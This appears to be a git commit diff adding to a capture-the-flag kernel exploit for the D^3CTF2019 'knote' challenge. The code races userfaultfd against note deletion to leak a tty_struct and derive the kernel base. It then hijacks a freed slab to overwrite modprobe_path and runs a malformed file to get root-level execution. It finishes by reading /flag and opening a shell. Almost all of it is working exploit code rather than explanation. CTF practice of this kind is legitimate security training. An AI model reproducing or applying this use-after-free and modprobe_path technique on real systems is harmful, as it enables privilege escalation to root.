0d00b9635d93338d2e74311287523957c4a79d84
Hornos3 <1914559880@qq.com>
2022-10-08 23:34:01 +0800

    update for d^3ctf2019-knote

--- kernel/challenges/D^3CTF2019-knote/rootfs/myexp.c
+++ kernel/challenges/D^3CTF2019-knote/rootfs/myexp.c
@@ -22,8 +22,13 @@ typedef struct input{
 #define DEL 0x6666
 #define TTY_STRUCT_SIZE 0x2E0
 
+#define DO_SAK_WORK_ADDR 0xFFFFFFFF815D4EF0
+#define COMMIT_CREDS 0xFFFFFFFF810B3040
+#define PREPARE_KERNEL_CRED 0xFFFFFFFF810B3390
+#define MODPROBE_PATH 0xFFFFFFFF8245C5C0
+
 int fd;
-char* faultBuffer;
+static char* faultBuffer;
 
 void get(int index, char* buffer){
     input in = {
@@ -83,7 +88,8 @@ fault_handler_thread(void *arg)
 
         nread = read(uffd, &msg, sizeof(msg));
 
-        sleep(10);
+        puts(GREEN "Parent process stopped here." CEND);
+        sleep(5);
 
         if (nread == 0)
             errExit("EOF on userfaultfd!\n");
@@ -110,7 +116,9 @@ fault_handler_thread(void *arg)
 int main(){
 
     saveStatus();
-
+    page_size = sysconf(_SC_PAGE_SIZE);
+    page = malloc(0x1000);
+    memset(page, '0', 0x1000);
     faultBuffer = (char*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     registerUserFaultFd(faultBuffer, 0x1000, (void*)fault_handler_thread);
 
@@ -127,13 +135,61 @@ int main(){
     if(pid < 0)
         errExit("Fork failed");
     else if(pid == 0){
-        puts("child process sleeping...");
+        puts(GREEN "Child process sleeping..." CEND);
         sleep(2);
+        puts(GREEN "Ready to delete note in child process..." CEND);
         dele(0);
         sleep(1);
+        puts(GREEN "Ready to open /dev/ptmx in child process..." CEND);
         open("/dev/ptmx", O_RDWR);
         exit(0);
     }else
         get(0, faultBuffer);
+
     print_binary(faultBuffer, TTY_STRUCT_SIZE);
+    u_int64_t do_sak_work = *((u_int64_t*)(faultBuffer + 0x2B0));
+    if(!do_sak_work)
+        errExit("Failed to get do_SAK_work!");
+    printf(GREEN "Successfully got address of do_SAK_work: %#zx" CEND, do_sak_work);
+    u_int64_t offset = do_sak_work - DO_SAK_WORK_ADDR;  // offset got
+
+    commit_creds = offset + COMMIT_CREDS;               // get address of commit_creds
+    prepare_kernel_cred = offset + PREPARE_KERNEL_CRED; // get address of prepare_kernel_cred
+    u_int64_t modprobe_path = offset + MODPROBE_PATH;   // get address of modprobe_path
+
+    add(0x100);
+    memcpy(page, &modprobe_path, 8);
+    pid = fork();
+    if(pid < 0)
+        errExit("Fork failed");
+    else if(pid == 0){
+        puts(GREEN "Child process sleeping..." CEND);
+        sleep(2);
+        puts(GREEN "Ready to delete note in child process..." CEND);
+        dele(0);
+        sleep(1);
+        puts(GREEN "Ready to open /dev/ptmx in child process..." CEND);
+        open("/dev/ptmx", O_RDWR);
+        exit(0);
+    }else
+        edit(0, page);
+
+    add(0x100);
+    add(0x100);     // this cache allocates to modprobe_path
+    edit(1, "/getFlag");
+
+    system("echo -e '\xff\xff\xff\xff' > /hook");
+    system("chmod +x /hook");
+    system("/hook");
+
+    sleep(1);
+    int flag = open("/flag", O_RDWR);
+    if(flag < 0)
+        errExit("Failed to open flag file!");
+    char flagContent[0x50] = {0};
+    read(flag, flagContent, 0x50);
+    write(1, flagContent, 0x50);
+    system("/bin/sh");
+
+    return 0;
 }
